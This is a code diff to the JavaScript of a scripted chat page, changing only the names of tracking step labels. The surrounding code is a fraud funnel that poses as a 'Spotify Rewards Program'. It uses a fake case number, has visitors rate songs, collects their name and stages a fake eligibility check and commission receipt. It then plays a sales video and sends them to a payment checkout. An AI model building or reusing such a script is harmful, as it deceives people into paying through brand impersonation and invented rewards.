@@ -894,13 +894,13 @@
 
       async function run() {
         // Etapa 01
-        step('inicio');
+        step('comeco');
         await say('To begin your service, your case number is 809821');
         await sleep(4000);
         await say("You've been one of the few people selected for the Spotify Rewards Program");
         await sleep(3000);
         await say("We've selected five songs for you to listen to and rate. It takes just a couple of minutes.");
-        step('avaliacao');
+        step('avaliacao1');
         media('/sp/songs/index.html', 355);
         await waitForSongs(600000);
         await sleep(3000);
@@ -909,7 +909,7 @@
 
         // Etapa 02
         await askButton('Start Verification');
-        step('start_verification');
+        step('start_verification1');
         step('iniciouspt');
         await sleep(2000);
         activateRepresentative();
@@ -929,10 +929,10 @@
         await say("Would you like to receive your reward for the work you've done?");
         await say('(Click the button below to continue)');
         await askButton('Yes, I do!');
-        step('yes_i_do');
+        step('yes_i_do1');
 
         // Etapa 04 - name
-        step('coleta_de_nome');
+        step('coleta_de_nome1');
         await sayStatus("Okay, I'll continue with your registration.", 'success');
         await sleep(3000);
         await say("At this stage, I need you to tell me your name so I can verify that you're a new user.");
@@ -944,13 +944,13 @@
         await sleep(6000);
 
         // Etapa 05
-        step('elegibilidade');
+        step('elegibilidade1');
         await updateStatus(checkingRow, 'Just a moment...', 'pending');
         await sleep(10000);
         await updateStatus(checkingRow, 'Everything looks good, {{nome}}!\n\nI checked our system and saw that you are eligible to receive your commission of ${{balance}}', 'success');
 
         // Etapa 06
-        step('recibo');
+        step('recibo1');
         await sleep(3000);
         await say('I\u2019m sending you the receipt for your commissions.');
         await sleep(1000);
@@ -979,7 +979,7 @@
         step('vslspt');
 
         // VSL + oferta
-        step('vsl_checkout');
+        step('vsl_checkout1');
         await sayStatus('Your access to withdraw your commission will be granted after this short explanatory video', 'alert');
         player('https://scripts.converteai.net/2223d7db-1826-46ab-bf08-708ee5b93e74/players/6a9b6338436465858b454fd7/v4/embed.html', 56.25);
         var __h = location.hostname;
@@ -993,7 +993,7 @@
         await sleep(3000);
         await say('You are being redirected to the payment page...');
         step('checkoutspt');
-        step('checkout');
+        step('checkout1');
         var checkoutUrl = window.spUrlWith(CHECKOUT, {
           name: vars.nome || '',
           nome: vars.nome || '',
